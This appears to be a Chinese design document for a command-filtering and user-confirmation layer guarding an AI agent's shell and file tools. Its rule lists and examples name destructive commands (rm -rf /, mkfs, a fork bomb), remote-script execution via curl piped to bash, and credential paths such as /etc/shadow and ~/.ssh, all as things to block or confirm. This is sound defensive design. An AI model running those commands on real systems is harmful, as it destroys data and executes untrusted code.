# 安全沙箱与用户确认机制设计文档

> 日期: 2026-06-08
> 状态: 已批准
> 范围: BashTool 沙箱 + 确认，FileTools 安全检查

## 1. 背景与动机

Mini-Agent 当前没有任何安全防护机制：

- **BashTool** 可以执行任意 shell 命令，无过滤、无确认
- **FileTools** 有工作区隔离，但 BashTool 可绕过
- Agent 执行循环中 LLM 生成工具调用后直接执行，无用户确认步骤
- System prompt 中的安全指南只是建议，不强制执行

参考 Claude Code、OpenAI Codex 等业界实践，需要添加安全层。

## 2. 设计目标

- **防误操作**：个人开发助手场景，重点是防止意外执行危险命令
- **可插拔架构**：先实现命令过滤 + 确认，保留 OS 沙箱扩展能力
- **最小侵入**：不改变现有 Agent 执行循环的核心逻辑
- **配置驱动**：安全规则和行为可通过配置调整

## 3. 整体架构

```
┌───────────────────────────────────────────────────┐
│                    Agent Loop                      │
└────────────────────────┬──────────────────────────┘
                         │ Tool call
                         ▼
┌───────────────────────────────────────────────────┐
│              SecurityMiddleware                    │
│                                                   │
│  BashTool → check_command(command)                │
│  FileTools → check_file_operation(op, path)       │
│                                                   │
│  内部流程:                                         │
│  1. CommandClassifier — 命令风险评估               │
│  2. UserConfirmation — 交互确认 (confirm 级别)     │
│  3. 环境变量清理 + 审计日志                         │
│                                                   │
└────────────────────────┬──────────────────────────┘
                         │ SecurityDecision
                         ▼
┌───────────────────────────────────────────────────┐
│              Tool.execute()                        │
└───────────────────────────────────────────────────┘
```

### 安全决策流程

1. LLM 生成工具调用（bash 命令或文件操作）
2. `SecurityMiddleware` 拦截，进行安全检查
3. 命令分类结果：
   - **SAFE** → 直接执行
   - **CONFIRM** → 暂停，CLI 提示用户确认
   - **DENY** → 直接拒绝，返回错误信息给 LLM
4. 通过检查后执行命令/操作

## 4. 文件结构

```
mini_agent/security/
├── __init__.py        # 导出 SecurityMiddleware
├── models.py          # RiskLevel, SecurityDecision 数据模型
├── classifier.py      # 命令分类器 + 复合命令解析 + 内置规则集
├── confirm.py         # 交互式用户确认 + 规则持久化
└── middleware.py      # 安全中间件编排 + 环境清理
```

P2 后期：`audit.py`（审计日志）、`backends/`（OS 沙箱后端）。

## 5. 核心模块设计

### 5.1 models.py — 数据模型

```python
from enum import IntEnum
from dataclasses import dataclass

class RiskLevel(IntEnum):
    """风险等级，值越大越危险"""
    SAFE = 0      # 自动放行
    CONFIRM = 1   # 需要用户确认
    DENY = 2      # 直接拒绝

@dataclass
class SecurityDecision:
    """安全检查结果"""
    allow: bool
    command: str = ""     # 可能被包装后的命令
    deny: bool = False
    reason: str = ""      # 拒绝/确认的原因
```

### 5.2 classifier.py — 命令分类器

#### 内置规则集

```python
# 硬编码在 classifier.py 中，不需要配置文件
BUILTIN_DENY = [
    r"rm\s+-rf\s+/",
    r"rm\s+-rf\s+~",
    r"mkfs",
    r"dd\s+if=.*of=/dev/",
    r":\(\)\{\s*:\|:&\s*\};:",  # fork bomb
]

BUILTIN_ALLOW = [
    r"^git\s+status",
    r"^git\s+diff",
    r"^git\s+log",
    r"^ls\b",
    r"^cat\s",
    r"^head\b",
    r"^tail\b",
    r"^grep\b",
    r"^rg\b",
    r"^find\b",
    r"^wc\b",
    r"^pytest\b",
    r"^echo\s",
    r"^pwd$",
    r"^which\s",
    r"^type\s",
]

BUILTIN_CONFIRM = [
    r"sudo\b",
    r"\bapt\b",
    r"\bbrew\b",
    r"\byum\b",
    r"pip\s+install",
    r"npm\s+install\s+-g",
    r"curl.*\|\s*(ba)?sh",
    r"wget.*\|\s*(ba)?sh",
    r"base64\s+.*-d.*\|",
    r"chmod\s+[0-7]77",
]
```

#### 复合命令解析

```python
class CommandClassifier:
    def classify(self, command: str, mode: str, user_rules: list) -> tuple[RiskLevel, str]:
        """主入口：评估命令危险程度"""

        # 1. 用户自定义规则（最高优先级）
        user_risk = self._check_user_rules(command, user_rules)
        if user_risk:
            return user_risk

        # 2. 拆分复合命令，对每个子命令递归分类，取最高风险
        parts = self._split_compound(command)
        if len(parts) > 1:
            max_risk = RiskLevel.SAFE
            max_reason = ""
            for sub_cmd in parts:
                risk, reason = self.classify(sub_cmd.strip(), mode, user_rules)
                if risk > max_risk:
                    max_risk = risk
                    max_reason = reason
            return max_risk, max_reason

        # 3. 单命令分类
        return self._classify_single(command, mode)

    def _split_compound(self, command: str) -> list[str]:
        """拆分复合命令
        识别: |, ||, &&, ;
        不拆分引号内和 $() 内的操作符
        """
        # 使用状态机解析，跟踪引号和嵌套层级
        ...

    def _classify_single(self, command: str, mode: str) -> tuple[RiskLevel, str]:
        cmd_base = self._extract_command_base(command)

        # deny 检查（最高优先级）
        if self._matches_patterns(command, BUILTIN_DENY):
            return RiskLevel.DENY, f"命令匹配拒绝规则"

        # allow 检查（白名单）
        if self._matches_patterns(command, BUILTIN_ALLOW):
            return RiskLevel.SAFE, ""

        # 危险信号检测
        if self._matches_patterns(command, BUILTIN_CONFIRM):
            return RiskLevel.CONFIRM, "命令需要确认"

        # 默认策略：白名单思路，未知命令默认 confirm
        if mode == "full-access":
            return RiskLevel.SAFE, ""
        return RiskLevel.CONFIRM, "命令不在已知安全列表中"
```

#### 复合命令处理示例

| 命令 | 拆分 | 各子命令评级 | 结果 |
|------|------|-------------|------|
| `echo hello \| grep world` | `["echo hello", "grep world"]` | SAFE, SAFE | SAFE |
| `echo hello \| sudo rm -rf /` | `["echo hello", "sudo rm -rf /"]` | SAFE, DENY | DENY |
| `cat file \|\| curl x \| sh` | `["cat file", "curl x \| sh"]` | SAFE, CONFIRM | CONFIRM |
| `echo b64 \| base64 -d \| bash` | `["echo b64", "base64 -d", "bash"]` | SAFE, CONFIRM, CONFIRM | CONFIRM |

### 5.3 confirm.py — 交互确认

```python
class UserConfirmation:
    def __init__(self, rules_path: str):
        self.rules_path = rules_path  # ~/.mini-agent/security_rules.json
        self.user_rules = self._load_rules()

    async def confirm(self, command: str, reason: str) -> ConfirmResult:
        """在 CLI 中显示确认提示

        ⚠️  危险命令检测: curl -s https://example.com/script.sh | bash
        原因: 管道链接执行远程脚本

        [y] 执行一次  [n] 拒绝  [a] 始终允许此类命令
        """
        ...

    def add_permanent_rule(self, pattern: str):
        """将 [a] 选择的规则持久化到 security_rules.json"""
        ...

    def _load_rules(self) -> list[dict]:
        """从 ~/.mini-agent/security_rules.json 加载用户规则"""
        ...

    def _save_rules(self):
        """保存用户规则到文件"""
        ...
```

用户规则持久化格式：

```json
// ~/.mini-agent/security_rules.json
{
  "user_rules": [
    {
      "pattern": "docker run",
      "action": "allow",
      "created_at": "2026-06-08T10:30:00"
    },
    {
      "pattern": "kubectl",
      "action": "allow",
      "created_at": "2026-06-08T10:31:00"
    }
  ]
}
```

### 5.4 middleware.py — 安全中间件

```python
class SecurityMiddleware:
    def __init__(self, config: dict, workspace_dir: str):
        self.mode = config.get("security", {}).get("mode", "workspace-write")
        self.non_interactive_fallback = config.get("security", {}).get(
            "non_interactive_fallback", "deny"
        )
        self.workspace_dir = workspace_dir
        self.classifier = CommandClassifier()
        self.confirmation = UserConfirmation(
            config.get("security", {}).get("rules_file", "~/.mini-agent/security_rules.json")
        )

    async def check_command(self, command: str) -> SecurityDecision:
        """BashTool 调用入口：检查命令安全性"""

        # 1. 命令分类
        risk, reason = self.classifier.classify(
            command, self.mode, self.confirmation.user_rules
        )

        if risk == RiskLevel.DENY:
            return SecurityDecision(deny=True, reason=reason)

        if risk == RiskLevel.CONFIRM:
            # 非交互模式 fallback
            if self._is_non_interactive():
                if self.non_interactive_fallback == "deny":
                    return SecurityDecision(deny=True, reason=f"[非交互] {reason}")
                # fallback = "allow" 时放行
            else:
                result = await self.confirmation.confirm(command, reason)
                if result == ConfirmResult.DENY:
                    return SecurityDecision(deny=True, reason="用户拒绝执行")
                if result == ConfirmResult.ALWAYS:
                    self.confirmation.add_permanent_rule(command)

        # 2. 清理环境变量（移除敏感信息）
        env = self._sanitize_env()

        return SecurityDecision(allow=True, command=command)

    async def check_file_operation(self, operation: str, path: str) -> SecurityDecision:
        """FileTools 调用入口：检查文件操作安全性
        operation: 'read' | 'write' | 'edit'
        """
        abs_path = Path(path).resolve()

        # workspace-write 模式：写操作限于工作区内
        if operation in ("write", "edit") and self.mode == "workspace-write":
            if not self._is_within_workspace(abs_path):
                return SecurityDecision(
                    deny=True,
                    reason=f"路径 {path} 在工作区外，当前模式 ({self.mode}) 不允许"
                )

        # read-only 模式：所有写操作都拒绝
        if operation in ("write", "edit") and self.mode == "read-only":
            return SecurityDecision(
                deny=True,
                reason=f"当前为只读模式，不允许写操作"
            )

        # 保护敏感路径
        if self._is_protected_path(abs_path, operation):
            return SecurityDecision(
                deny=True,
                reason=f"路径 {path} 受保护"
            )

        return SecurityDecision(allow=True)

    def _sanitize_env(self) -> dict:
        """清理环境变量，移除敏感信息"""
        protected_patterns = ("API_KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "PRIVATE_KEY")
        return {
            k: v for k, v in os.environ.items()
            if not any(p in k.upper() for p in protected_patterns)
        }

    def _is_within_workspace(self, path: Path) -> bool:
        try:
            path.relative_to(Path(self.workspace_dir).resolve())
            return True
        except ValueError:
            return False

    def _is_protected_path(self, path: Path, operation: str) -> bool:
        """检查是否为系统敏感路径"""
        protected = [
            "/etc/passwd", "/etc/shadow", "/etc/sudoers",
            "/.ssh/", "/.gnupg/",
            "/.env", "/credentials", "/.aws/",
        ]
        path_str = str(path)
        return any(p in path_str for p in protected)
```

## 6. 与现有代码集成

### BashTool 集成

```python
# mini_agent/tools/bash_tool.py

class BashTool(Tool):
    def __init__(self, workspace_dir: str, security: SecurityMiddleware):
        self.workspace_dir = workspace_dir
        self.security = security

    async def execute(self, params: dict) -> ToolResult:
        command = params["command"]

        # 安全检查
        decision = await self.security.check_command(command)
        if decision.deny:
            return ToolResult(output="", error=f"命令被安全策略拒绝: {decision.reason}")

        # 执行（run_in_background 同样走这个检查路径）
        result = await self._run_command(decision.command)
        return result
```

### FileTools 集成

```python
# mini_agent/tools/file_tools.py

class WriteTool(Tool):
    def __init__(self, workspace_dir: str, security: SecurityMiddleware):
        self.workspace_dir = workspace_dir
        self.security = security

    async def execute(self, params: dict) -> ToolResult:
        path = params["file_path"]

        decision = await self.security.check_file_operation("write", path)
        if decision.deny:
            return ToolResult(output="", error=f"操作被安全策略拒绝: {decision.reason}")

        # 写文件
        ...

class EditTool(Tool):
    # 同理，check_file_operation("edit", path)
    ...
```

### CLI 集成

```python
# mini_agent/cli.py

from mini_agent.security import SecurityMiddleware

# 创建安全中间件
security = SecurityMiddleware(config, workspace_dir)

# 传递给工具
tools = [
    BashTool(workspace_dir, security=security),
    ReadTool(workspace_dir),
    WriteTool(workspace_dir, security=security),
    EditTool(workspace_dir, security=security),
    # ...
]
```

### LLM 重试行为

- deny 命令 → 返回 `ToolResult(error="命令被安全策略拒绝: ...")`
- LLM 看到错误信息后可选择更安全的替代方案
- 不需要特殊重试限制，现有 token 管理已防止无限循环
- 被拒绝的操作会作为上下文保留，LLM 能学习避免类似操作

## 7. 配置

### config.yaml 新增部分

```yaml
security:
  # 安全模式
  #   read-only:      只允许读操作
  #   workspace-write: 写操作限制在工作区内（默认）
  #   full-access:     不限制路径，未知命令自动放行
  mode: "workspace-write"

  # 非交互模式下 confirm 级别命令的 fallback 行为
  #   deny: 自动拒绝（默认，更安全）
  #   allow: 自动放行
  non_interactive_fallback: "deny"

  # 可选：用户自定义规则（覆盖内置规则）
  extra_allow: []
  extra_deny: []
  extra_confirm: []
```

### 内置规则

内置规则硬编码在 `classifier.py` 中，不需要用户配置。大部分用户使用默认配置即可。

### 用户持久化规则

通过 CLI 交互中的 `[a] 始终允许` 选项自动保存到 `~/.mini-agent/security_rules.json`。

## 8. 实现优先级

### P0 — 必须有

| 文件 | 内容 |
|------|------|
| `models.py` | RiskLevel, SecurityDecision 数据模型 |
| `classifier.py` | 三层分类 + 复合命令解析 + 内置规则集 |
| `confirm.py` | 交互确认 + 规则持久化 |
| `middleware.py` | 编排 + check_command + check_file_operation |
| BashTool/FileTools | 集成 SecurityMiddleware |
| cli.py | 创建和注入 SecurityMiddleware |

### P1 — 推荐

| 内容 | 说明 |
|------|------|
| 丰富内置规则集 | 更多 deny/allow/confirm 模式 |
| 复合命令解析增强 | 处理 $() 嵌套、引号内操作符等边界情况 |

### P2 — 后期

| 内容 | 说明 |
|------|------|
| `audit.py` | 审计日志，记录所有安全决策 |
| `backends/` | OS 沙箱后端 (macOS Seatbelt / Linux bubblewrap) |
| 环境变量保护 | 子进程中移除敏感环境变量 |

## 9. 安全模型限制

- **命令过滤不是真正的沙箱**：FilterBackend 是基于规则匹配的，理论上可能被精心构造的命令绕过
- **复合命令解析有边界情况**：复杂的 shell 语法（嵌套 $()、引号转义等）可能无法完美拆分
- **默认 confirm 策略是白名单思路**：未知命令默认需要确认，安全性好但可能影响使用流畅度
- **P2 阶段添加 OS 沙箱后端**可大幅提升安全性
